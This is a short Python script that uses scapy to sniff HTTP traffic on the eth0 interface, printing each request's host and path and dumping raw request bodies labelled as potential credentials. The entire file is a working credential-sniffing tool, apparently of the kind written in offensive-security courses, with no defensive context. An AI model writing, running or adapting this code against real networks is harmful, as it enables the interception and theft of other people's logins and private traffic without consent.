#! /bin/python3
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_potential_credentials(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        return load


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet).decode()
        print("[+] HTTP request > ", url)

        credential = get_potential_credentials(packet)
        if credential is not None:
            print("\n\n[+] POTENTIAL CREDENTIAL > ", credential.decode(), "\n\n")


sniff("eth0")
